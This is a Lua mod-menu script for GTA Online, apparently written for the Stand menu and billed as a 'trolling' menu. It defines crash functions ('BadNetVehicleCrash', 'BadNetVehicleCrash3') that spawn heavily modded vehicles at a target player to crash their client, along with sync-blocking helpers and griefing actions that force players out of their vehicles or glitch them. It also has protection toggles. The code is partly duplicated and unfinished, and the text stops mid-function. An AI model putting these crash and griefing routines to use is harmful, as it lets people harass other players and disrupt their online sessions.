util.keep_running()
util.require_natives("natives-1672190175-uno")
util.require_natives("natives-1663599433-uno")
util.require_natives("natives-1640181023")
util.require_natives("natives-1651208000")
util.require_natives("natives-1663599433")

util.toast("Welcome to <TODO> Script\n" .. "\n" .. "This Menu Is For Trolling.\n" .. "\n" .. "If you were invited, congrats!\n" .. "\n" .. "Made by Candy & Aplics ")

util.log("░█████╗░██████╗░░█████╗░░██████╗██╗░░██╗")
util.log("██╔══██╗██╔══██╗██╔══██╗██╔════╝██║░░██║")
util.log("██║░░╚═╝██████╔╝███████║╚█████╗░███████║")
util.log("██║░░██╗██╔══██╗██╔══██║░╚═══██╗██╔══██║")
util.log("╚█████╔╝██║░░██║██║░░██║██████╔╝██║░░██║")
util.log("░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝")

---------------------------------------------------------------------------------------------------------------------------------------
local function BlockSyncsExcept(pid, state) -- false as in allow syncs, true as in block syncs
    for _, pid2 in pairs(players.list(false, true, true)) do
        if pid ~= pid2 then
            menu.trigger_commands("desync "..players.get_name(pid2).." "..(state and "on" or "off"))
            menu.trigger_commands("ignore "..players.get_name(pid2).." "..(state and "on" or "off"))
            util.log("desync "..players.get_name(pid2).." "..(state and "on" or "off"))
            util.log("ignore "..players.get_name(pid2).." "..(state and "on" or "off"))
            util.yield()
        end
    end
end


--@alias Entity integer

---@param entity Entity
---@param distance number
---@return userdata

GetCoordsInFrontOfEntity = function(entity, distance)
	if not ENTITY.DOES_ENTITY_EXIST(entity) then
		return v3.new(0.0, 0.0, 0.0)
	end
	local coords = ENTITY.GET_ENTITY_FORWARD_VECTOR(entity)
	coords:mul(distance)
	coords:add(ENTITY.GET_ENTITY_COORDS(entity, true))
	return coords
end


---@param list Entity[]

function RqModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    local count = 0
    util.toast("Requesting model...")
    while not STREAMING.HAS_MODEL_LOADED(hash) and count < 100 do
        STREAMING.REQUEST_MODEL(hash)
        count = count + 1
        util.yield(10)
    end
    if not STREAMING.HAS_MODEL_LOADED(hash) then
        util.toast("Tried for 1 second, couldn't load this specified model!")
    end
end

function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

G_GeneratedList = false --



local function request_model(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
end

custselc = menu.list(menu.my_root(), "Select Pussies", {}, "", function(); end)

function AddEntityToList(listName, handle, generatedCheck)
    if ((not G_GeneratedList) and generatedCheck) or (not generatedCheck) then
        G_GeneratedList = true
        local lis = menu.list(custselc, listName .. " handle " .. handle, {}, "")
        menu.action(lis, "Delete", {"deleteservicecrash"}, "", function()
            entities.delete_by_handle(handle)
            menu.delete(lis)
            G_GeneratedList = false
        end)
        menu.action(lis, "Teleport to entity", {"toentity"}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(handle)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(GetLocalPed(), pos.x, pos.y, pos.z + 1, false, false, false)
        end)
        menu.action(lis, "Drive Entity", {"driveentity"}, "", function()
            PED.SET_PED_INTO_VEHICLE(GetLocalPed(), handle, -1)
        end)
        menu.action(lis, "Teleport to you", {"entitytome"}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(handle, pos.x, pos.y, pos.z + 1, false, false, false)
        end)
    end
end

function CreateVehicle(Hash, Pos, Heading, Invincible)
	STREAMING.REQUEST_MODEL(Hash)
	while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
	local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
	if Invincible then
		ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
	end
	return SpawnedVehicle
end


local function setAttribute(attacker)
    PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 46, true)

    PED.SET_PED_COMBAT_RANGE(attacker, 4)
    PED.SET_PED_COMBAT_ABILITY(attacker, 3)
end

local function BlockSyncs(pid, callback)
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "on")
		end
	end
	util.yield(10)
	callback()
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "off")
		end
	end
end



local selectedobject = 1268884662
local all_objects = {

-1268884662,
1085274000,
1729911864,
2166988379,
3702106121,
1398809829,
1043035044,
3639322914,
464329140,
4046278932,
3785611910,
388197031,
2977746558,
659187150,
420170064,
2436749075,
1193854962,
476379176,
630616933,
3945660640,
1565925668,
175309727,
3196461136,
3251728163,
176008245,
2112015640,
993120320,
865627822,
266130508,
3762892718,
3854180205,
2804199464,
523317885,
1327834842,
1321190118,
29828513,
-1026778664,
310817095,
4130089803,
148511758,
3087007557,
2969831089,
3533371316,
2024855755,
2450168807,
297107423,
2017086435,
3553022755,
4046278932,
3639322914,
3231494328,
3271283456,
386059801,
202070568,
1971657777,
2005313754,
3859048180,
866394777,
740404217,
2409855828,
286298615,
795984016,
2374537677,
3161612443,
1165195353,
2450522579,
4260070095,
974883178,
3965551402,
3854180205,
3696781377,
4124467285,
2684801972,
3449848423,
118627012,
1565925668,
1924419321,
2201918560,
3762892718,
266130508,
1193854962, 
630616933,
476379176,
2436749075,
2154892897,
1369811908,
2420804668,
1948561556,
356462018,
462203053,
3552768664,
2057223314,
3290378943,
168901740,
303280717,
725259233,
2064599526,
4204303756,
3185604174,
1046958884,
81317377,
2539784170,
795367207,
2684668286,
827574655,
617299305,
3999634798,
2082302221

} 

local object_names = {

"Bricks",
"Pizza's",
"prop_boombox_01",
"xm3_prop_xm3_boombox_01a",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
"10",
"11",
"12",
"13",
"14",
"15",
"16",
"17",
"18",
"19",
"20",
"21",
"22",
"23",
"24",
"25",
"26",
"27",
"28",
"29",
"Dandy's",
"Keypad's",
"Brittle Bush",
"Saplin",
"Fragment",
"Gas",
"Ball",
"Flagpole",
"Combat MG",
"Mag1",
"Barrel",
"40mm",
"Corp Rope",
"prop_amb_ciggy_01",
"prop_table_03_chr",
"prop_parasol_03",
"prop_traffic_01d",
"prop_streetlight_01",
"v_serv_bs_gelx3",
"prop_table_03",
"v_serv_bs_foam1",
"v_ret_ta_paproll2",
"v_serv_bs_razor",
"prop_tv_05",
"v_ret_gc_box2",
"prop_rub_stool",
"prop_speaker_05",
"v_serv_bs_shvbrush",
"v_serv_bs_shampoo",
"v_ret_ta_spray",
"v_serv_bs_cond",
"v_serv_bs_clutter",
"v_ilev_bs_door",
"prop_ld_purse_01",
"prop_amb_phone",
"prop_bin_10b",
"prop_amb_40oz_02",
"p_amb_coffeecup_01",
"prop_coffee_mac_02",
"prop_fire_exting_2a",
"prop_wall_light_06a",
"prop_xmas_ext",
"xm_prop_x17_osphatch_col",
"reh_prop_reh_sign_jk_01a",
"reh_prop_reh_bag_para_01a",
"tr_prop_tr_meet_coll_01",
"vw_prop_vw_garage_coll_01a",
"prop_forsale_dyn_01",
"xm_prop_base_cabinet_door_01",
"xm_prop_x17dlc_rep_sign_01a",
"gr_prop_gr_bunkeddoor_col",
"v_ret_ta_firstaid",
"prop_aircon_m_01",
"prop_wall_light_02a",
"v_ret_gc_calc",
"prop_micro_04",
"prop_gumball_02",
"prop_watercooler",
"prop_radio_01",
"prop_game_clock_01",
"prop_cctv_cam_06a",
"prop_till_01",
"prop_chair_02",
"prop_chair_04a",
"xs_prop_arena_flipper_large_01a",
"xs_prop_arena_flipper_small_01a",
"xs_prop_arena_flipper_xl_01a",
"xs_prop_arena_flipper_large_01a_sf",
"xs_prop_arena_flipper_small_01a_sf",
"xs_prop_arena_flipper_xl_01a_sf",
"xs_prop_arena_flipper_large_01a_wl",
"xs_prop_arena_flipper_small_01a_wl",
"xs_prop_arena_flipper_xl_01a_wl",
"xs_prop_trophy_flipper_01a",
"prop_paints_pallete01"

}



local function RequestModel(Hash, timeout)
    STREAMING.REQUEST_MODEL(Hash)
    local time = util.current_time_millis() + (timeout or 1000)
    while time > util.current_time_millis() and not STREAMING.HAS_MODEL_LOADED(Hash) do
        util.yield()
    end
    return STREAMING.HAS_MODEL_LOADED(Hash)
end
local function RequestControl(Entity, timeout)
    local time = util.current_time_millis() + (timeout or 1000)
    while time > util.current_time_millis() and not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(Entity) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Entity)
        util.yield()
    end
    return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(Entity)
end
local function ClearEntities(list)
    for _, entity in pairs(list) do
        if ENTITY.DOES_ENTITY_EXIST(entity) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, false, false)
            RequestControl(entity)
            entities.delete_by_handle(entity)
        end
    end
end
local function CreateObject(Hash, Pos, static)
    RequestModel(Hash)
    local Object = entities.create_object(Hash, Pos)
    ENTITY.FREEZE_ENTITY_POSITION(Object, (static or false))
    return Object
end

---------------------------------------------------------------------------------------------------------------------------------------

---@alias Entity integer

---@param entity Entity
---@param distance number
---@return userdata
GetCoordsInFrontOfEntity = function(entity, distance)
	if not ENTITY.DOES_ENTITY_EXIST(entity) then
		return v3.new(0.0, 0.0, 0.0)
	end
	local coords = ENTITY.GET_ENTITY_FORWARD_VECTOR(entity)
	coords:mul(distance)
	coords:add(ENTITY.GET_ENTITY_COORDS(entity, true))
	return coords
end

---@param entity Entity
RequestControl = function(entity, timeOut)
	timeOut = timeOut or 1000
	local start = util.current_time_millis()
	while not NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and
	util.current_time_millis() - start < timeOut do
		util.yield_once()
	end
	return util.current_time_millis() - start < timeOut
end

---@param list Entity[]
ClearEntities = function(list)
	for _, entity in ipairs(list) do
		if ENTITY.DOES_ENTITY_EXIST(entity) then
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, false, false)
			RequestControl(entity)
			entities.delete_by_handle(entity)
		end
	end
end

function CreateVehicle(Hash, Pos, Heading, Invincible)
	STREAMING.REQUEST_MODEL(Hash)
	while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
	local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
	if Invincible then
		ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
	end
	return SpawnedVehicle
end

function CreateObject(Hash, Pos, static)
	STREAMING.REQUEST_MODEL(Hash)
	while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
	local SpawnedVehicle = entities.create_object(Hash, Pos)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
	if static then
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
	end
	return SpawnedVehicle
end

---------------------------------------------------------------------------------------------------------------------------------------


local colors = {
    green = 20,
    red = 23,
    yellow = 190,
    black = 2,
    white = 1,
    gray = 3,
    pink = 201,
    purple = 49, --, 21, 96
    blue = 11
}


local txdDict = "DIA_VICTIM"
local txdName = "DIA_VICTIM"

if filesystem.exists(filesystem.resources_dir() .. "Yatekomo.ytd") then
    util.register_file(filesystem.resources_dir() .. "Yatekomo.ytd")
    txdDict = "Yatekomo"
    txdName = "earth"
end
local function request_model(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
end
local function BlockSyncs(pid, callback)
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "on")
		end
	end
	util.yield(10)
	callback()
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "off")
		end
	end
end
function notification(msg, color)
    if not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(txdDict) then
        GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(txdDict)
        while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(txdDict) do
            util.yield()
        end
    end
--    HUD.THEFEED_SET_BACKGROUND_COLOR_FOR_NEXT_POST(color)
    -- HUD.BEGIN_TEXT_COMMAND_THEFEED_POST("STRING")
    -- HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(msg)
    util.BEGIN_TEXT_COMMAND_THEFEED_POST(msg)
    HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(txdDict, txdName, true, 15, "TODO!!!", "~c~CRASH!!!~s~")
    HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
end
notification("TIME!!!", colors.black)

local function CreateVehicle(Hash, Pos, Heading, Invincible)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if Invincible then
        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

local function log(content)
end

request_control_of_entity = function(entity, time)

    local unixtime = util.current_unix_time_seconds()
    local seconds = unixtime + time

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and unixtime < seconds do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
        util.yield()
    end
    if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
        return entity
    else
        return 0
    end
end

local function player_index(pid)
    local player_index = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    return player_index
end

local function get_player_vehicle(pid, with_access)
    local player_index = player_index(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(player_index, true) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(player_index, false)
        if with_access then
            request_control_of_entity(vehicle, 5)
            return vehicle
        else
            return vehicle
        end
    end
end


local function ChangeNetObjOwner(object, player)
    if NETWORK.NETWORK_IS_IN_SESSION() then
        local net_object_mgr = get_player_vehicle(pid, false)
        if net_object_mgr == NULL then
            return false
        end
        if not ENTITY.DOES_ENTITY_EXIST(object) then
            return false
        end
        local netObj = entities.get_all_vehicles_as_handles()
        if netObj == NULL then
            return false
        end
        local net_game_player = players.user()
        if net_game_player == NULL then
            return false
        end
        return true
    else
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
        return true
    end
end

local function get_interior_player_is_in(pid)
    return memory.read_int(memory.script_global(((2689224 + 1) + (pid * 451)) + 242)) 
end

local function is_player_in_interior(pid)
    return (memory.read_int(memory.script_global(((2689224 + 1) + (pid * 451)) + 242 )) == 0)
end

local get_blip_coords = function(blipId)
    local blip = HUD.GET_FIRST_BLIP_INFO_ID(blipId)
    if blip ~= 0 then return HUD.GET_BLIP_COORDS(blip) end
    return v3(0, 0, 0)
end

local function notification(message, length) 
    if length ~= nil and length > 0 then
        length = length*1000
    else
        length = 3000
    end
end

local function RqModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    local time = util.current_time_millis() + 5000
    while not STREAMING.HAS_MODEL_LOADED(hash) and time > util.current_time_millis() do
        STREAMING.REQUEST_MODEL(hash)
        util.yield()
    end
    return STREAMING.HAS_MODEL_LOADED(hash)
end
local getEntityCoords = ENTITY.GET_ENTITY_COORDS
local getPlayerPed = PLAYER.GET_PLAYER_PED
local requestModel = STREAMING.REQUEST_MODEL
local hasModelLoaded = STREAMING.HAS_MODEL_LOADED
local noNeedModel = STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED

local function BadNetVehicleCrash(pid)
    local hashes = {-1041692462}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x+5, pcoords.y+5, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(pid))
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    util.yield()
    util.toast("finished.")
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end
local function BadNetVehicleCrash3(pid)
    local hashes = {1349725314,-1041692462,-255678177,1591739866}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(pid))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    util.yield()
    util.toast("finished.")
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end

menu.action(menu.my_root(), "Go to Players List", {"gotopl"}, "Shotcut for players list.", function()
    menu.trigger_commands("playerlist")
end)


protex = menu.list(menu.my_root(), "Protections", {}, "", function() end)

menu.action(menu.my_root(), "Restart Script", {"restartaddictlua"}, "Restarts the script to check for updates. Or you may prefer it on hotkey to make it the first script in players list making spectate option faster to find.", function ()
    util.restart_script()
end)

menu.toggle_loop(protex, "No Entity Spawn", {"noentities"}, "De spawns all entites.", function(on_loop)
    local ct = 0
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
        entities.delete_by_handle(ent)

        ct = ct + 1
    end
    for k,ent in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ent) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)

        end
        ct = ct + 1
    end
    for k,ent in pairs(entities.get_all_objects_as_handles()) do
        if ent ~= PLAYER.PLAYER_PED_ID() then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            ct = ct + 1
        end
    end
        for k,ent in pairs(entities.get_all_pickups_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            util.yield()
        return
    end
end)


menu.action(protex, "Stop All Sounds", {}, "", function()
    for i = -1, 100 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
    end
end)

menu.action(protex, "Remove Attachments", {""}, "", function()
    notification("Removing Attachments", colors.black)
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
    else
        menu.trigger_commands("mpfemale")
    end
end)


menu.action(protex, "Clear Everything", {"cleanse"}, "", function()
    util.toast("Cleaning Area...")
    util.yield(500)
    local entitycount = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) and not ENTITY.IS_ENTITY_A_MISSION_ENTITY(ped) then
            entities.delete_by_handle(ped)
            entitycount += 1
        end
    end
    util.toast("Cleared " .. entitycount .. " Peds")
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        if vehicle ~= PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) and not ENTITY.IS_ENTITY_A_MISSION_ENTITY(veh) then
            entities.delete_by_handle(veh)
            util.yield()
            entitycount += 1
        end
    end
    util.toast("Cleared ".. entitycount .." Vehicles")
    for _, object in pairs(entities.get_all_objects_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
        entities.delete_by_handle(object)
        util.yield()
        entitycount += 1
    end
    util.toast("Cleared " .. entitycount .. " Objects")
    for _, pickup in pairs(entities.get_all_pickups_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(pickup, false, false)
        entities.delete_by_handle(pickup)
        util.yield()
        entitycount += 1
    end
    util.toast("Cleared " .. entitycount .. " Pickups")
    util.toast("Cleansing You Of Skidded Ropes")
    local temp = memory.alloc(4)
    for i = 1, 100 do
        memory.write_int(temp, i)
        PHYSICS.DELETE_ROPE(temp)
        util.yield()
    end
    util.toast("Cleared All Ropes")
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    MISC.CLEAR_AREA_OF_PROJECTILES(coords.x, coords.y, coords.z, 400, 0)
    util.toast("Cleared All Projectiles")
    util.yield(500)
    util.toast("Area Has Been Cleaned!")
end)
menu.action(protex, "Super cleanse", {"JUST DO IT"}, "", function(on_click)
    local ct = 0
    notification("Working", colors.black)
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
        entities.delete_by_handle(ent)

        ct = ct + 1
    end
    util.toast("Finished")
    for k,ent in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ent) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)

        end
        ct = ct + 1
    end

end)
menu.divider(protex, "Crash Protections")


menu.toggle(protex, "Toggle Block all Network Events", {}, "Block all network event transmission", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    if on_toggle then
        menu.trigger_command(BlockNetEvents)
        notification("Toggling block all network events on... stay safe homie", colors.green)
    else
        menu.trigger_command(UnblockNetEvents)
        notification("toggling block all network events off...", colors.red)
    end
end)


menu.toggle(protex, "Toggle Block all Incoming Syncs", {}, "", function(on_toggle)
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_command(BlockIncSyncs)
        notification("Toggling block all incoming syncs on... stay safe homie", colors.green)
    else
        menu.trigger_command(UnblockIncSyncs)
        notification("toggling block all incoming syncs off...", colors.red)
    end
end)

menu.toggle(protex, "Toggle Block all Outgoing Syncs", {}, "", function(on_toggle)
    if on_toggle then
        notification("Toggling block all outgoing syncs on", colors.green)
        menu.trigger_commands("desyncall on")
    else
        notification("Toggling block all outgoing syncs off", colors.red)
        menu.trigger_commands("desyncall off")
    end
end)

menu.toggle(protex, "anticrashcamera", {"acc"}, "", function(on_toggle)
    if on_toggle then
        notification("Toggling anticrashcamera... stay safe homie", colors.green)
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("potatomode on")
    else
        notification("Toggling anticrashcamera off...", colors.red)
        menu.trigger_commands("anticrashcamera off")
        menu.trigger_commands("potatomode off")
    end
end)



menu.toggle(protex, "Panic Mod", {"panic"}, "Stay safe homie", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        notification("toggling panic mode on... stay safe homie", colors.green)
        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        notification("toggling panic mode off...", colors.red)
        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)


players.on_join(function(pid)

        local root = menu.list(menu.player_root(pid), "<TODO> Script")

    menu.divider(root, "TODO")

    local Removals_List = menu.list(root, "Crashes", {"crashes"}, "")
    local Plyrveh_list = menu.list(root, "Griefing", {"griefing", ""})
    local Veh_List = menu.list(root, "Vehicle Events", {"vehevent", ""})

    menu.action(root, "Spectate", {"spec"}, "", function()
        if pids == PLAYER.PLAYER_ID() then
            notification("Spectating " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            return
        else
            notification("Can't Spectate yourself?", colors.blue)
        end
        menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid))
        local hash = util.joaat("baller")
        local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end
            local Coords1 = PlayerCoords.y + 10
            local Coords2 = PlayerCoords.y - 10
        menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
        end
    end)

    menu.divider(Removals_List, "TODO Crashes")

    menu.divider(Plyrveh_list, "TODO Griefing")
    
    menu.divider(Veh_List, "TODO Vehicle Events")

    menu.toggle(Veh_List, "Glitch Vehicle", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("p_spinning_anus_s")
        STREAMING.REQUEST_MODEL(glitch_hash)
        while not STREAMING.HAS_MODEL_LOADED(glitch_hash) do
            util.yield()
        end
        if not PED.IS_PED_IN_VEHICLE(player, PED.GET_VEHICLE_PED_IS_IN(player), false) then
            util.toast("Player isn't in a vehicle. :/")
            return
        end
        glitched_object = entities.create_object(glitch_hash, playerpos)
        ENTITY.SET_ENTITY_VISIBLE(glitched_object, false)
        ENTITY.SET_ENTITY_INVINCIBLE(glitched_object, true)
        ENTITY.SET_ENTITY_COLLISION(glitched_object, true, true)
        util.yield(100)
        entities.delete_by_handle(glitched_object)
        util.yield()
    end)

    menu.action(Veh_List, "Kick from Vehicle", {}, "Spawns a ped to rip them out and drives away. works on all menus.", function()
        local vehicle = get_player_vehicle(pid, false)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, -2.0, 0.0, 0.1)
        ENTITY.SET_ENTITY_VELOCITY(vehicle, 0, 0, 0)
        local ped = PED.CREATE_RANDOM_PED(coords.x, coords.y, coords.z)
        TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true)
        TASK.TASK_ENTER_VEHICLE(ped, vehicle, 0, -1, 15, 24, true)
        util.yield(20)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
        for _ = 1, 20 do
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped, vehicle, 100.0, 2883621)
            util.yield(50)
            end
        end)
        
        menu.action(Veh_List, "Take Over Vehicle",{},"Spawns a ped to rip them out and teleports you inside. works on all menus.", function()
        local player_index = player_index(players.user())
